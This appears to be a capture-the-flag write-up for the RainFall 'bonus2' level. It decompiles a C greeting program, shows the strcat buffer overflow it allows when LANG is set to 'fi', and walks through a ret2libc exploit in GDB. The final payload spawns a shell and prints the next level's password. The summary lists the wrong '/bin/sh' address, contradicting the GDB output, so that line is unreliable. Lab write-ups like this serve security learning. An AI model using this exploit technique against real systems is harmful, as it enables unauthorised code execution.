Let's disassmble `bonus2`.
My best decompilation attemp is following:
``` c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int language;

struct message
{
   char word1[40];
   char word2[32];
   char *language_code;
};

void greetuser(struct message message)
{
   char text[72];

   if (language == 1)
   {
      strcpy(text, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 ");
   }
   if (language == 2)
   {
      strcpy(text, "Goedemiddag! ");
   }
   if (language == 0)
   {
      strcpy(text, "Hello ");
   }

   strcat(text, message.word1);
   puts(text);
}

int main(int argc, char **argv)
{
   struct message message;

   if (argc != 3)
      return 1;

   memset(&message, 0, sizeof(struct message));

   strncpy(message.word1, argv[1], 40);
   strncpy(message.word2, argv[2], 32);

   message.language_code = getenv("LANG");
   if (message.language_code != NULL)
   {
      if (memcmp(message.language_code, "fi", 2) == 0)
         language = 1;
      if (memcmp(message.language_code, "nl", 2) == 0)
         language = 2;
   }

   greetuser(message);
   return 0;
}
```

Immediately we see an opportunity for buffer overflow: string `text` in function `greetuser` has length 72, but the maximum string that will be copied in it has length 84.
*84 = 40(argv[1]) + 32(argv[2]) + 12(the Finish greeting)*

To perform the buffer oveflow we should execute following steps:
1. Set LANG environment variable to `fi`
2. Pass as first argument a string with length 40
3. Pass as second argument a string with length 32

Let's try to this in GDB:
``` shell
$ gdb bonus2
(gdb) set args AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
(gdb) r
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Cool!
Now let's find the return address in out strings.
It is located here (look at `x`): `BBBBBBBBBBBBBBBBBBxxxx8BBBBBBBBBB`

Now, I'll perform `ret2libc` attack.
To do it, I'll need addresses of `system` function and of `/bin/sh` string.
I'll find them using GDB:
``` shell
(gdb) start
(gdb) print system
$6 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) info proc map
process 7262
Mapped address spaces:

   Start Addr   End Addr       Size     Offset objfile
    0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
    0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
   0xb7e2b000 0xb7e2c000     0x1000        0x0 
   0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fd2000 0xb7fd5000     0x3000        0x0 
   0xb7fdb000 0xb7fdd000     0x2000        0x0 
   0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
   0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
   0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
   0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
   0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, +99999999, "/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:  "/bin/sh"
```

So, here are the addresses:
`system` -> 0xb7e6b060
`/bin/sh` -> 0xb7e2c000

Finally, I need to insert these addresses into my arguments:
``` shell
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB `echo -e 'BBBBBBBBBBBBBBBBBB\x60\xb0\xe6\xb7BBBB\x58\xcc\xf8\xb7BBB'`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`??BBBBX???BB
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```